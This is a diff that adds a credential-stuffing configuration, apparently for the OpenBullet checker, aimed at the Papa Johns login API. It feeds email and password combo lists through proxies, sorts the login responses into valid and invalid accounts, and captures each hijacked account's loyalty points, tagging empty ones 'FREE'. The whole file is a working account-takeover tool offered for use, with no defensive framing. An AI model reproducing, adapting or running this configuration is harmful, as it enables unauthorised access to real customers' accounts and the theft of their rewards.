@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Papa Johns",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-20T23:11:56.1191335+00:00",
+  "AdditionalInfo": "",
+  "Author": "Banana Frog <3",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST_REQUEST_Login REQUEST POST "https://www.papajohns.com/api/v3/sessions" AutoRedirect=TRUE 
+  CONTENT "{\"email\":\"<USER>\",\"rememberMe\":true,\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: PJ4.25.1/10177 CFNetwork/811.5.4 Darwin/16.7.0" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "This email and/or password is not currently valid. Please re-enter your information, or check to see if your password needs to be reset to meet our current password requirements." 
+    KEY "UNAUTHORIZED" 
+    KEY "{\"messages\":[{\"code\":\"UNAUTHORIZED\",\"description\":\"This email and/or password is not currently valid. Please re-enter your information, or check to see if your password needs to be reset to meet our current password requirements.\"}]}" 
+  KEYCHAIN Success OR 
+    KEY "customer" 
+    KEY "customerCommunicationPreferences" 
+    KEY "address1" 
+    KEY "pointsEarned" 
+#Capture_Points_Available PARSE "<SOURCE>" JSON "pointsAvailable" Recursive=FALSE -> CAP "Points Available" "" "" 
+#Capture_Points_Earned PARSE "<SOURCE>" JSON "pointsEarned" Recursive=FALSE -> CAP "Total Points Earned" "" "" 
+#Capture_Points_To_Be_Earned PARSE "<SOURCE>" JSON "pointsToBeEarned" Recursive=FALSE -> CAP "Points To Be Earned" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "{\"pointsAvailable\":0" 
+    KEY "\"pointsEarned\":0" 
